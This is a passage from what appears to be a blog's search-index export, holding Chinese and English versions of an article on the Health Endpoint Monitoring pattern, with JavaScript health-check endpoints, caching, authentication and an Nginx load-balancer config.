&#x3D;&#x3D;&#x3D; &#39;ok&#39; ? &#39;healthy&#39; : &#39;degraded&#39;, responseTime: await this.measureResponseTime( () &#x3D;&gt; this.cache.get(&#39;health_check&#39;) ) &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;degraded&#39;; checks.checks.cache &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; 检查外部服务 try &#123; const response &#x3D; await this.externalService.healthCheck(); checks.checks.externalService &#x3D; &#123; status: response.ok ? &#39;healthy&#39; : &#39;degraded&#39;, responseTime: response.time &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;degraded&#39;; checks.checks.externalService &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; 返回适当的状态码 const statusCode &#x3D; checks.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503; res.status(statusCode).json(checks); &#125; async measureResponseTime(operation) &#123; const start &#x3D; Date.now(); await operation(); return Date.now() - start; &#125; &#125; 健康检查层级 不同目的使用不同端点： 1. 存活探测 回答：「应用程序是否正在运行？」 &#x2F;&#x2F; 最小检查 - 只验证进程是否存活 app.get(&#39;&#x2F;health&#x2F;live&#39;, (req, res) &#x3D;&gt; &#123; res.status(200).json(&#123; status: &#39;alive&#39; &#125;); &#125;); 2. 就绪探测 回答：「应用程序是否准备好处理请求？」 &#x2F;&#x2F; 检查依赖项是否可用 app.get(&#39;&#x2F;health&#x2F;ready&#39;, async (req, res) &#x3D;&gt; &#123; try &#123; &#x2F;&#x2F; 验证关键依赖项 await database.ping(); await cache.ping(); res.status(200).json(&#123; status: &#39;ready&#39; &#125;); &#125; catch (error) &#123; &#x2F;&#x2F; 尚未准备好服务流量 res.status(503).json(&#123; status: &#39;not_ready&#39;, reason: error.message &#125;); &#125; &#125;); 3. 详细健康检查 回答：「每个组件的状态如何？」 app.get(&#39;&#x2F;health&#x2F;detailed&#39;, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await comprehensiveHealthCheck.checkAll(); res.status(health.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503).json(&#123; status: health.status, components: &#123; database: health.database, cache: health.cache, messageQueue: health.messageQueue, externalAPIs: health.externalAPIs &#125;, metrics: &#123; requestsPerSecond: metrics.getRequestRate(), averageResponseTime: metrics.getAverageResponseTime(), errorRate: metrics.getErrorRate() &#125; &#125;); &#125;); 响应码及其含义 使用 HTTP 状态码来传达健康状态： class HealthStatusCodes &#123; static OK &#x3D; 200; &#x2F;&#x2F; 一切健康 static DEGRADED &#x3D; 200; &#x2F;&#x2F; 运作中但有问题 static SERVICE_UNAVAILABLE &#x3D; 503; &#x2F;&#x2F; 关键故障 static TIMEOUT &#x3D; 504; &#x2F;&#x2F; 健康检查耗时过长 static determineStatusCode(checks) &#123; const hasCriticalFailure &#x3D; checks.some( check &#x3D;&gt; check.critical &amp;&amp; check.status &#x3D;&#x3D;&#x3D; &#39;unhealthy&#39; ); if (hasCriticalFailure) &#123; return this.SERVICE_UNAVAILABLE; &#125; const hasNonCriticalFailure &#x3D; checks.some( check &#x3D;&gt; !check.critical &amp;&amp; check.status &#x3D;&#x3D;&#x3D; &#39;unhealthy&#39; ); if (hasNonCriticalFailure) &#123; return this.DEGRADED; &#125; return this.OK; &#125; &#125; 安全性考量 健康端点可能会暴露敏感信息。适当地保护它们： 1. 对详细检查使用身份验证 &#x2F;&#x2F; 公开端点 - 最少信息 app.get(&#39;&#x2F;health&#39;, (req, res) &#x3D;&gt; &#123; res.status(200).json(&#123; status: &#39;ok&#39; &#125;); &#125;); &#x2F;&#x2F; 受保护端点 - 详细信息 app.get(&#39;&#x2F;health&#x2F;detailed&#39;, authenticateMonitoring, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await detailedHealthCheck(); res.json(health); &#125;); function authenticateMonitoring(req, res, next) &#123; const token &#x3D; req.headers[&#39;x-monitoring-token&#39;]; if (token !&#x3D;&#x3D; process.env.MONITORING_TOKEN) &#123; return res.status(401).json(&#123; error: &#39;Unauthorized&#39; &#125;); &#125; next(); &#125; 2. 使用隐晦的路径 &#x2F;&#x2F; 不使用 &#x2F;health，使用较不明显的路径 const healthPath &#x3D; process.env.HEALTH_CHECK_PATH || &#39;&#x2F;health&#39;; app.get(healthPath, healthCheckHandler); 3. 速率限制 const rateLimit &#x3D; require(&#39;express-rate-limit&#39;); const healthCheckLimiter &#x3D; rateLimit(&#123; windowMs: 60 * 1000, &#x2F;&#x2F; 1 分钟 max: 60, &#x2F;&#x2F; 每分钟 60 个请求 message: &#39;Too many health check requests&#39; &#125;); app.get(&#39;&#x2F;health&#39;, healthCheckLimiter, healthCheckHandler); 缓存健康状态 避免健康检查压垮系统： class CachedHealthCheck &#123; constructor(ttlSeconds &#x3D; 10) &#123; this.ttl &#x3D; ttlSeconds * 1000; this.cache &#x3D; null; this.lastCheck &#x3D; 0; &#125; async getHealth() &#123; const now &#x3D; Date.now(); &#x2F;&#x2F; 如果仍然有效，返回缓存结果 if (this.cache &amp;&amp; (now - this.lastCheck) &lt; this.ttl) &#123; return this.cache; &#125; &#x2F;&#x2F; 执行实际的健康检查 this.cache &#x3D; await this.performHealthCheck(); this.lastCheck &#x3D; now; return this.cache; &#125; async performHealthCheck() &#123; &#x2F;&#x2F; 实际的健康检查逻辑 return &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), checks: await this.runAllChecks() &#125;; &#125; &#125; &#x2F;&#x2F; 使用缓存的健康检查 const cachedHealth &#x3D; new CachedHealthCheck(10); app.get(&#39;&#x2F;health&#39;, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await cachedHealth.getHealth(); res.status(health.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503).json(health); &#125;); 与负载均衡器集成 负载均衡器使用健康检查将流量仅路由到健康的实例： # Nginx 配置 upstream backend &#123; server app1.example.com:8080; server app2.example.com:8080; server app3.example.com:8080; &#125; server &#123; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;backend; # 健康检查配置 health_check interval&#x3D;10s fails&#x3D;3 passes&#x3D;2 uri&#x3D;&#x2F;health&#x2F;ready match&#x3D;health_ok; &#125; &#125; # 定义「健康」的含义 match health_ok &#123; status 200; body ~ &quot;\\&quot;status\\&quot;:\\&quot;ready\\&quot;&quot;; &#125; 从多个位置监控 从不同地理位置检查应用程序： graph TB A[监控服务 美东] -->|每 30 秒检查| B[应用程序] C[监控服务 欧洲西部] -->|每 30 秒检查| B D[监控服务 亚太地区] -->|每 30 秒检查| B B --> E[警报系统] E -->|如果 2+ 位置故障| F[发送警报] E -->|如果 1 位置故障| G[记录警告] style B fill:#4dabf7,stroke:#1971c2 style F fill:#ff6b6b,stroke:#c92a2a style G fill:#ffd43b,stroke:#fab005 class MultiLocationMonitor &#123; constructor(locations) &#123; this.locations &#x3D; locations; this.results &#x3D; new Map(); &#125; async checkAllLocations(endpoint) &#123; const checks &#x3D; this.locations.map(location &#x3D;&gt; this.checkFromLocation(location, endpoint) ); const results &#x3D; await Promise.allSettled(checks); &#x2F;&#x2F; 分析结果 const failures &#x3D; results.filter(r &#x3D;&gt; r.status &#x3D;&#x3D;&#x3D; &#39;rejected&#39; || r.value.status !&#x3D;&#x3D; 200 ); if (failures.length &gt;&#x3D; 2) &#123; &#x2F;&#x2F; 多个位置故障 - 关键问题 await this.sendAlert(&#39;critical&#39;, endpoint, failures); &#125; else if (failures.length &#x3D;&#x3D;&#x3D; 1) &#123; &#x2F;&#x2F; 单一位置故障 - 可能的网络问题 await this.sendAlert(&#39;warning&#39;, endpoint, failures); &#125; return results; &#125; async checkFromLocation(location, endpoint) &#123; const start &#x3D; Date.now(); const response &#x3D; await fetch(&#96;$&#123;location.url&#125;$&#123;endpoint&#125;&#96;); const duration &#x3D; Date.now() - start; return &#123; location: location.name, status: response.status, duration, timestamp: new Date().toISOString() &#125;; &#125; &#125; 最佳实践 💡 健康检查指南保持快速：健康检查应在 1 秒内完成 检查依赖项：验证关键组件如数据库 使用适当的超时：不要让健康检查无限期挂起 返回有意义的状态：使用适当的 HTTP 状态码 缓存结果：避免检查压垮系统 保护敏感端点：保护详细的健康信息 监控监控器：确保监控系统正常运作 要避免的常见陷阱 ⚠️ 不该做的事不要让健康检查太复杂：它们应该快速且简单 不要暴露敏感数据：避免揭示内部架构细节 不要跳过关键依赖项：如果数据库故障，要报告 不要忽略响应时间：缓慢的响应表示有问题 不要对所有事情使用相同端点：将存活与就绪分开 何时使用此模式 此模式对以下情况至关重要： ✅ Web 应用程序：验证可用性和正确操作 ✅ 微服务：监控分布式系统中个别服务的健康状态 ✅ 负载均衡应用程序：启用自动流量路由到健康实例 ✅ 自动扩展系统：决定何时添加或移除实例 ✅ 高可用性系统：快速检测故障以进行容错转移 实际范例：电子商务平台 class ECommerceHealthCheck &#123; constructor(dependencies) &#123; this.database &#x3D; dependencies.database; this.cache &#x3D; dependencies.cache; this.paymentGateway &#x3D; dependencies.paymentGateway; this.inventoryService &#x3D; dependencies.inventoryService; &#125; async checkHealth() &#123; const checks &#x3D; await Promise.allSettled([ this.checkDatabase(), this.checkCache(), this.checkPaymentGateway(), this.checkInventoryService() ]); const [database, cache, payment, inventory] &#x3D; checks; &#x2F;&#x2F; 决定整体健康状态 const criticalFailures &#x3D; [database, payment].filter( check &#x3D;&gt; check.status &#x3D;&#x3D;&#x3D; &#39;rejected&#39; ); const status &#x3D; criticalFailures.length &gt; 0 ? &#39;unhealthy&#39; : &#39;healthy&#39;; return &#123; status, timestamp: new Date().toISOString(), components: &#123; database: this.formatCheck(database, true), cache: this.formatCheck(cache, false), paymentGateway: this.formatCheck(payment, true), inventoryService: this.formatCheck(inventory, false) &#125; &#125;; &#125; async checkDatabase() &#123; const start &#x3D; Date.now(); await this.database.query(&#39;SELECT 1&#39;); return &#123; responseTime: Date.now() - start &#125;; &#125; async checkCache() &#123; const start &#x3D; Date.now(); await this.cache.ping(); return &#123; responseTime: Date.now() - start &#125;; &#125; async checkPaymentGateway() &#123; const start &#x3D; Date.now(); const response &#x3D; await this.paymentGateway.healthCheck(); return &#123; responseTime: Date.now() - start, available: response.status &#x3D;&#x3D;&#x3D; &#39;operational&#39; &#125;; &#125; async checkInventoryService() &#123; const start &#x3D; Date.now(); const response &#x3D; await fetch(&#39;http:&#x2F;&#x2F;inventory-service&#x2F;health&#39;); return &#123; responseTime: Date.now() - start, status: response.status &#125;; &#125; formatCheck(check, critical) &#123; if (check.status &#x3D;&#x3D;&#x3D; &#39;fulfilled&#39;) &#123; return &#123; status: &#39;healthy&#39;, critical, ...check.value &#125;; &#125; else &#123; return &#123; status: &#39;unhealthy&#39;, critical, error: check.reason.message &#125;; &#125; &#125; &#125; 结论 健康端点监控模式是应用程序的生命体征监测器。就像医生使用简单的检查来评估病人健康一样，监控工具使用健康端点来验证应用程序是否正常运作。通过实现适当的健康检查，你可以： 在用户遇到故障之前检测到它们 启用自动流量路由到健康实例 提供系统健康状态的可见性 支持自动扩展和自我修复系统 从简单的存活检查开始，然后随着系统成长逐渐添加更全面的健康验证。记住：健康的应用程序是知道自己何时生病的应用程序。 参考资料 健康端点监控模式 - Microsoft Learn 相关模式：断路器模式、Sidecar 模式","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"健康端點監控：保持服務的活力與健康","slug":"2019/11/Health-Endpoint-Monitoring-Pattern-zh-TW","date":"un55fin55","updated":"un22fin22","comments":true,"path":"/zh-TW/2019/11/Health-Endpoint-Monitoring-Pattern/","permalink":"https://neo01.com/zh-TW/2019/11/Health-Endpoint-Monitoring-Pattern/","excerpt":"透過專用端點實作健康檢查，監控應用程式的可用性和效能。學習如何在使用者發現問題之前，驗證服務是否正常運作。","text":"想像一間診所，病人可以隨時走進去做快速健康檢查——量體溫、血壓、心跳——幾分鐘內就能測量完畢。醫生不需要進行手術就能知道是否有問題；這些簡單的生命徵象就能揭示病人的健康狀態。這正是健康端點監控模式為應用程式所做的事：它提供一種快速、非侵入式的方法來檢查服務是否健康。 挑戰：在問題發生時及時發現 在現代分散式系統中，應用程式依賴多個元件： 資料庫和儲存系統 外部 API 和服務 訊息佇列 快取層 網路基礎設施 這些元件都可能故障，當它們故障時，你需要立即知道——在使用者發現之前。 傳統方法：等待抱怨 &#x2F;&#x2F; 應用程式盲目運行 class PaymentService &#123; async processPayment(order) &#123; try &#123; &#x2F;&#x2F; 希望資料庫可用 await this.database.save(order); &#x2F;&#x2F; 希望支付閘道正常 await this.paymentGateway.charge(order.amount); return &#123; success: true &#125;; &#125; catch (error) &#123; &#x2F;&#x2F; 使用者首先發現問題 console.error(&#39;Payment failed:&#39;, error); return &#123; success: false, error: error.message &#125;; &#125; &#125; &#125; ⚠️ 被動監控的問題延遲偵測：當使用者抱怨時才知道故障 糟糕的使用者體驗：使用者在關鍵操作時遇到錯誤 難以診斷：很難確定什麼故障以及何時故障 無法主動行動：無法預防問題或重新路由流量 解決方案：健康端點監控 公開專用端點，讓外部監控工具可以定期檢查以驗證應用程式的健康狀態。 graph TB A[監控工具] -->|HTTP GET /health| B[負載平衡器] B --> C[應用程式實例 1] B --> D[應用程式實例 2] B --> E[應用程式實例 3] C --> C1[健康檢查] D --> D1[健康檢查] E --> E1[健康檢查] C1 --> C2[資料庫] C1 --> C3[快取] C1 --> C4[外部 API] D1 --> C2 D1 --> C3 D1 --> C4 E1 --> C2 E1 --> C3 E1 --> C4 C1 -->|200 OK| B D1 -->|200 OK| B E1 -->|503 Error| B B -->|從池中移除| E style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#ff6b6b,stroke:#c92a2a style C1 fill:#51cf66,stroke:#2f9e44 style D1 fill:#51cf66,stroke:#2f9e44 style E1 fill:#ff6b6b,stroke:#c92a2a 基本實作 &#x2F;&#x2F; 簡單的健康端點 class HealthCheckController &#123; async checkHealth(req, res) &#123; try &#123; &#x2F;&#x2F; 驗證應用程式正在運行 const status &#x3D; &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), uptime: process.uptime() &#125;; res.status(200).json(status); &#125; catch (error) &#123; res.status(503).json(&#123; status: &#39;unhealthy&#39;, error: error.message &#125;); &#125; &#125; &#125; &#x2F;&#x2F; 註冊端點 app.get(&#39;&#x2F;health&#39;, (req, res) &#x3D;&gt; &#123; healthCheck.checkHealth(req, res); &#125;); 全面的健康檢查 強健的健康端點會驗證關鍵依賴項： class ComprehensiveHealthCheck &#123; constructor(database, cache, externalService) &#123; this.database &#x3D; database; this.cache &#x3D; cache; this.externalService &#x3D; externalService; &#125; async checkHealth(req, res) &#123; const checks &#x3D; &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), checks: &#123;&#125; &#125;; &#x2F;&#x2F; 檢查資料庫連線 try &#123; await this.database.ping(); checks.checks.database &#x3D; &#123; status: &#39;healthy&#39;, responseTime: await this.measureResponseTime( () &#x3D;&gt; this.database.ping() ) &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;unhealthy&#39;; checks.checks.database &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; 檢查快取可用性 try &#123; await this.cache.set(&#39;health_check&#39;, &#39;ok&#39;, 10); const value &#x3D; await this.cache.get(&#39;health_check&#39;); checks.checks.cache &#x3D; &#123; status: value &#x3D;&#x3D;&#x3D; &#39;ok&#39; ? &#39;healthy&#39; : &#39;degraded&#39;, responseTime: await this.measureResponseTime( () &#x3D;&gt; this.cache.get(&#39;health_check&#39;) ) &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;degraded&#39;; checks.checks.cache &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; 檢查外部服務 try &#123; const response &#x3D; await this.externalService.healthCheck(); checks.checks.externalService &#x3D; &#123; status: response.ok ? &#39;healthy&#39; : &#39;degraded&#39;, responseTime: response.time &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;degraded&#39;; checks.checks.externalService &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; 回傳適當的狀態碼 const statusCode &#x3D; checks.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503; res.status(statusCode).json(checks); &#125; async measureResponseTime(operation) &#123; const start &#x3D; Date.now(); await operation(); return Date.now() - start; &#125; &#125; 健康檢查層級 不同目的使用不同端點： 1. 存活探測 回答：「應用程式是否正在運行？」 &#x2F;&#x2F; 最小檢查 - 只驗證程序是否存活 app.get(&#39;&#x2F;health&#x2F;live&#39;, (req, res) &#x3D;&gt; &#123; res.status(200).json(&#123; status: &#39;alive&#39; &#125;); &#125;); 2. 就緒探測 回答：「應用程式是否準備好處理請求？」 &#x2F;&#x2F; 檢查依賴項是否可用 app.get(&#39;&#x2F;health&#x2F;ready&#39;, async (req, res) &#x3D;&gt; &#123; try &#123; &#x2F;&#x2F; 驗證關鍵依賴項 await database.ping(); await cache.ping(); res.status(200).json(&#123; status: &#39;ready&#39; &#125;); &#125; catch (error) &#123; &#x2F;&#x2F; 尚未準備好服務流量 res.status(503).json(&#123; status: &#39;not_ready&#39;, reason: error.message &#125;); &#125; &#125;); 3. 詳細健康檢查 回答：「每個元件的狀態如何？」 app.get(&#39;&#x2F;health&#x2F;detailed&#39;, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await comprehensiveHealthCheck.checkAll(); res.status(health.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503).json(&#123; status: health.status, components: &#123; database: health.database, cache: health.cache, messageQueue: health.messageQueue, externalAPIs: health.externalAPIs &#125;, metrics: &#123; requestsPerSecond: metrics.getRequestRate(), averageResponseTime: metrics.getAverageResponseTime(), errorRate: metrics.getErrorRate() &#125; &#125;); &#125;); 回應碼及其含義 使用 HTTP 狀態碼來傳達健康狀態： class HealthStatusCodes &#123; static OK &#x3D; 200; &#x2F;&#x2F; 一切健康 static DEGRADED &#x3D; 200; &#x2F;&#x2F; 運作中但有問題 static SERVICE_UNAVAILABLE &#x3D; 503; &#x2F;&#x2F; 關鍵故障 static TIMEOUT &#x3D; 504; &#x2F;&#x2F; 健康檢查耗時過長 static determineStatusCode(checks) &#123; const hasCriticalFailure &#x3D; checks.some( check &#x3D;&gt; check.critical &amp;&amp; check.status &#x3D;&#x3D;&#x3D; &#39;unhealthy&#39; ); if (hasCriticalFailure) &#123; return this.SERVICE_UNAVAILABLE; &#125; const hasNonCriticalFailure &#x3D; checks.some( check &#x3D;&gt; !check.critical &amp;&amp; check.status &#x3D;&#x3D;&#x3D; &#39;unhealthy&#39; ); if (hasNonCriticalFailure) &#123; return this.DEGRADED; &#125; return this.OK; &#125; &#125; 安全性考量 健康端點可能會暴露敏感資訊。適當地保護它們： 1. 對詳細檢查使用身份驗證 &#x2F;&#x2F; 公開端點 - 最少資訊 app.get(&#39;&#x2F;health&#39;, (req, res) &#x3D;&gt; &#123; res.status(200).json(&#123; status: &#39;ok&#39; &#125;); &#125;); &#x2F;&#x2F; 受保護端點 - 詳細資訊 app.get(&#39;&#x2F;health&#x2F;detailed&#39;, authenticateMonitoring, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await detailedHealthCheck(); res.json(health); &#125;); function authenticateMonitoring(req, res, next) &#123; const token &#x3D; req.headers[&#39;x-monitoring-token&#39;]; if (token !&#x3D;&#x3D; process.env.MONITORING_TOKEN) &#123; return res.status(401).json(&#123; error: &#39;Unauthorized&#39; &#125;); &#125; next(); &#125; 2. 使用隱晦的路徑 &#x2F;&#x2F; 不使用 &#x2F;health，使用較不明顯的路徑 const healthPath &#x3D; process.env.HEALTH_CHECK_PATH || &#39;&#x2F;health&#39;; app.get(healthPath, healthCheckHandler); 3. 速率限制 const rateLimit &#x3D; require(&#39;express-rate-limit&#39;); const healthCheckLimiter &#x3D; rateLimit(&#123; windowMs: 60 * 1000, &#x2F;&#x2F; 1 分鐘 max: 60, &#x2F;&#x2F; 每分鐘 60 個請求 message: &#39;Too many health check requests&#39; &#125;); app.get(&#39;&#x2F;health&#39;, healthCheckLimiter, healthCheckHandler); 快取健康狀態 避免健康檢查壓垮系統： class CachedHealthCheck &#123; constructor(ttlSeconds &#x3D; 10) &#123; this.ttl &#x3D; ttlSeconds * 1000; this.cache &#x3D; null; this.lastCheck &#x3D; 0; &#125; async getHealth() &#123; const now &#x3D; Date.now(); &#x2F;&#x2F; 如果仍然有效，回傳快取結果 if (this.cache &amp;&amp; (now - this.lastCheck) &lt; this.ttl) &#123; return this.cache; &#125; &#x2F;&#x2F; 執行實際的健康檢查 this.cache &#x3D; await this.performHealthCheck(); this.lastCheck &#x3D; now; return this.cache; &#125; async performHealthCheck() &#123; &#x2F;&#x2F; 實際的健康檢查邏輯 return &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), checks: await this.runAllChecks() &#125;; &#125; &#125; &#x2F;&#x2F; 使用快取的健康檢查 const cachedHealth &#x3D; new CachedHealthCheck(10); app.get(&#39;&#x2F;health&#39;, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await cachedHealth.getHealth(); res.status(health.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503).json(health); &#125;); 與負載平衡器整合 負載平衡器使用健康檢查將流量僅路由到健康的實例： # Nginx 設定 upstream backend &#123; server app1.example.com:8080; server app2.example.com:8080; server app3.example.com:8080; &#125; server &#123; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;backend; # 健康檢查設定 health_check interval&#x3D;10s fails&#x3D;3 passes&#x3D;2 uri&#x3D;&#x2F;health&#x2F;ready match&#x3D;health_ok; &#125; &#125; # 定義「健康」的含義 match health_ok &#123; status 200; body ~ &quot;\\&quot;status\\&quot;:\\&quot;ready\\&quot;&quot;; &#125; 從多個位置監控 從不同地理位置檢查應用程式： graph TB A[監控服務 美東] -->|每 30 秒檢查| B[應用程式] C[監控服務 歐洲西部] -->|每 30 秒檢查| B D[監控服務 亞太地區] -->|每 30 秒檢查| B B --> E[警報系統] E -->|如果 2+ 位置故障| F[發送警報] E -->|如果 1 位置故障| G[記錄警告] style B fill:#4dabf7,stroke:#1971c2 style F fill:#ff6b6b,stroke:#c92a2a style G fill:#ffd43b,stroke:#fab005 class MultiLocationMonitor &#123; constructor(locations) &#123; this.locations &#x3D; locations; this.results &#x3D; new Map(); &#125; async checkAllLocations(endpoint) &#123; const checks &#x3D; this.locations.map(location &#x3D;&gt; this.checkFromLocation(location, endpoint) ); const results &#x3D; await Promise.allSettled(checks); &#x2F;&#x2F; 分析結果 const failures &#x3D; results.filter(r &#x3D;&gt; r.status &#x3D;&#x3D;&#x3D; &#39;rejected&#39; || r.value.status !&#x3D;&#x3D; 200 ); if (failures.length &gt;&#x3D; 2) &#123; &#x2F;&#x2F; 多個位置故障 - 關鍵問題 await this.sendAlert(&#39;critical&#39;, endpoint, failures); &#125; else if (failures.length &#x3D;&#x3D;&#x3D; 1) &#123; &#x2F;&#x2F; 單一位置故障 - 可能的網路問題 await this.sendAlert(&#39;warning&#39;, endpoint, failures); &#125; return results; &#125; async checkFromLocation(location, endpoint) &#123; const start &#x3D; Date.now(); const response &#x3D; await fetch(&#96;$&#123;location.url&#125;$&#123;endpoint&#125;&#96;); const duration &#x3D; Date.now() - start; return &#123; location: location.name, status: response.status, duration, timestamp: new Date().toISOString() &#125;; &#125; &#125; 最佳實踐 💡 健康檢查指南保持快速：健康檢查應在 1 秒內完成 檢查依賴項：驗證關鍵元件如資料庫 使用適當的逾時：不要讓健康檢查無限期掛起 回傳有意義的狀態：使用適當的 HTTP 狀態碼 快取結果：避免檢查壓垮系統 保護敏感端點：保護詳細的健康資訊 監控監控器：確保監控系統正常運作 要避免的常見陷阱 ⚠️ 不該做的事不要讓健康檢查太複雜：它們應該快速且簡單 不要暴露敏感資料：避免揭示內部架構細節 不要跳過關鍵依賴項：如果資料庫故障，要報告 不要忽略回應時間：緩慢的回應表示有問題 不要對所有事情使用相同端點：將存活與就緒分開 何時使用此模式 此模式對以下情況至關重要： ✅ Web 應用程式：驗證可用性和正確操作 ✅ 微服務：監控分散式系統中個別服務的健康狀態 ✅ 負載平衡應用程式：啟用自動流量路由到健康實例 ✅ 自動擴展系統：決定何時新增或移除實例 ✅ 高可用性系統：快速偵測故障以進行容錯移轉 實際範例：電子商務平台 class ECommerceHealthCheck &#123; constructor(dependencies) &#123; this.database &#x3D; dependencies.database; this.cache &#x3D; dependencies.cache; this.paymentGateway &#x3D; dependencies.paymentGateway; this.inventoryService &#x3D; dependencies.inventoryService; &#125; async checkHealth() &#123; const checks &#x3D; await Promise.allSettled([ this.checkDatabase(), this.checkCache(), this.checkPaymentGateway(), this.checkInventoryService() ]); const [database, cache, payment, inventory] &#x3D; checks; &#x2F;&#x2F; 決定整體健康狀態 const criticalFailures &#x3D; [database, payment].filter( check &#x3D;&gt; check.status &#x3D;&#x3D;&#x3D; &#39;rejected&#39; ); const status &#x3D; criticalFailures.length &gt; 0 ? &#39;unhealthy&#39; : &#39;healthy&#39;; return &#123; status, timestamp: new Date().toISOString(), components: &#123; database: this.formatCheck(database, true), cache: this.formatCheck(cache, false), paymentGateway: this.formatCheck(payment, true), inventoryService: this.formatCheck(inventory, false) &#125; &#125;; &#125; async checkDatabase() &#123; const start &#x3D; Date.now(); await this.database.query(&#39;SELECT 1&#39;); return &#123; responseTime: Date.now() - start &#125;; &#125; async checkCache() &#123; const start &#x3D; Date.now(); await this.cache.ping(); return &#123; responseTime: Date.now() - start &#125;; &#125; async checkPaymentGateway() &#123; const start &#x3D; Date.now(); const response &#x3D; await this.paymentGateway.healthCheck(); return &#123; responseTime: Date.now() - start, available: response.status &#x3D;&#x3D;&#x3D; &#39;operational&#39; &#125;; &#125; async checkInventoryService() &#123; const start &#x3D; Date.now(); const response &#x3D; await fetch(&#39;http:&#x2F;&#x2F;inventory-service&#x2F;health&#39;); return &#123; responseTime: Date.now() - start, status: response.status &#125;; &#125; formatCheck(check, critical) &#123; if (check.status &#x3D;&#x3D;&#x3D; &#39;fulfilled&#39;) &#123; return &#123; status: &#39;healthy&#39;, critical, ...check.value &#125;; &#125; else &#123; return &#123; status: &#39;unhealthy&#39;, critical, error: check.reason.message &#125;; &#125; &#125; &#125; 結論 健康端點監控模式是應用程式的生命徵象監測器。就像醫生使用簡單的檢查來評估病人健康一樣，監控工具使用健康端點來驗證應用程式是否正常運作。透過實作適當的健康檢查，你可以： 在使用者遇到故障之前偵測到它們 啟用自動流量路由到健康實例 提供系統健康狀態的可見性 支援自動擴展和自我修復系統 從簡單的存活檢查開始，然後隨著系統成長逐漸新增更全面的健康驗證。記住：健康的應用程式是知道自己何時生病的應用程式。 參考資料 健康端點監控模式 - Microsoft Learn 相關模式：斷路器模式、Sidecar 模式","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"Health Endpoint Monitoring: Keeping Your Services Alive and Well","slug":"2019/11/Health-Endpoint-Monitoring-Pattern","date":"un55fin55","updated":"un22fin22","comments":true,"path":"2019/11/Health-Endpoint-Monitoring-Pattern/","permalink":"https://neo01.com/2019/11/Health-Endpoint-Monitoring-Pattern/","excerpt":"Implement health checks through dedicated endpoints to monitor application availability and performance. Learn how to verify your services are running correctly before users discover problems.","text":"Imagine a doctor’s office where patients can walk in anytime for a quick health check—temperature, blood pressure, heart rate—all measured in minutes. The doctor doesn’t need to perform surgery to know if something’s wrong; these simple vital signs reveal the patient’s health status. This is exactly what the Health Endpoint Monitoring pattern does for your applications: it provides a quick, non-invasive way to check if your services are healthy. The Challenge: Knowing When Things Go Wrong In modern distributed systems, applications depend on multiple components: Databases and storage systems External APIs and services Message queues Cache layers Network infrastructure Any of these can fail, and when they do, you need to know immediately—before your users do. The Traditional Approach: Wait for Complaints &#x2F;&#x2F; Application runs blindly class PaymentService &#123; async processPayment(order) &#123; try &#123; &#x2F;&#x2F; Hope the database is available await this.database.save(order); &#x2F;&#x2F; Hope the payment gateway works await this.paymentGateway.charge(order.amount); return &#123; success: true &#125;; &#125; catch (error) &#123; &#x2F;&#x2F; User discovers the problem first console.error(&#39;Payment failed:&#39;, error); return &#123; success: false, error: error.message &#125;; &#125; &#125; &#125; ⚠️ Problems with Reactive MonitoringLate Detection: You learn about failures when users complain Poor User Experience: Users encounter errors during critical operations Difficult Diagnosis: Hard to determine what failed and when No Proactive Action: Can't prevent issues or reroute traffic The Solution: Health Endpoint Monitoring Expose dedicated endpoints that external monitoring tools can check regularly to verify your application’s health. graph TB A[Monitoring Tool] -->|HTTP GET /health| B[Load Balancer] B --> C[App Instance 1] B --> D[App Instance 2] B --> E[App Instance 3] C --> C1[Health Check] D --> D1[Health Check] E --> E1[Health Check] C1 --> C2[Database] C1 --> C3[Cache] C1 --> C4[External API] D1 --> C2 D1 --> C3 D1 --> C4 E1 --> C2 E1 --> C3 E1 --> C4 C1 -->|200 OK| B D1 -->|200 OK| B E1 -->|503 Error| B B -->|Remove from pool| E style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#ff6b6b,stroke:#c92a2a style C1 fill:#51cf66,stroke:#2f9e44 style D1 fill:#51cf66,stroke:#2f9e44 style E1 fill:#ff6b6b,stroke:#c92a2a Basic Implementation &#x2F;&#x2F; Simple health endpoint class HealthCheckController &#123; async checkHealth(req, res) &#123; try &#123; &#x2F;&#x2F; Verify application is running const status &#x3D; &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), uptime: process.uptime() &#125;; 